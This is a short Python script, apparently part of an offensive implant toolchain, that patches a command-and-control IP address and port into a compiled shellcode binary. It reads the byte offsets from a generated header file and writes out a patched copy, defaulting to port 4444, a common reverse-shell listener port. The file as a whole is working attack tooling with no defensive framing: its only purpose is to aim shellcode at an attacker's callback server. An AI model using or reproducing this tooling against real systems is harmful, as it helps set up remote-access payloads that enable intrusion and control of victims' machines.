#!/usr/bin/env python3
"""patch_config.py — patch C2 IP and port into shellcode binary"""
import argparse, struct, re, sys
from pathlib import Path

def find_header(binary_path: Path) -> Path:
    candidates = [
        binary_path.parent / 'shellcode.h',
        Path('shellcode.h'),
        Path('combined/shellcode.h'),
    ]
    for c in candidates:
        if c.exists():
            return c
    return None

def main():
    p = argparse.ArgumentParser()
    p.add_argument('binary', help='shellcode.bin')
    p.add_argument('--ip', default='127.0.0.1')
    p.add_argument('--port', type=int, default=4444)
    p.add_argument('--out', default=None)
    args = p.parse_args()

    binary_path = Path(args.binary)
    data = bytearray(binary_path.read_bytes())

    header_path = find_header(binary_path)
    if not header_path:
        print("ERROR: shellcode.h not found. Run 'make' first.", file=sys.stderr)
        sys.exit(1)

    header = header_path.read_text()
    ip_off   = int(re.search(r'CONFIG_IP_OFFSET\s+(\d+)', header).group(1))
    port_off = int(re.search(r'CONFIG_PORT_OFFSET\s+(\d+)', header).group(1))

    data[ip_off:ip_off+4] = bytes(int(x) for x in args.ip.split('.'))
    data[port_off:port_off+2] = struct.pack('>H', args.port)

    out = args.out or str(binary_path).replace('.bin', '_patched.bin')
    Path(out).write_bytes(data)
    print(f"[+] Patched: IP={args.ip} PORT={args.port}")
    print(f"    IP   at offset {ip_off}: {args.ip}")
    print(f"    Port at offset {port_off}: {args.port}")
    print(f"    Output: {out}")

if __name__ == '__main__':
    main()
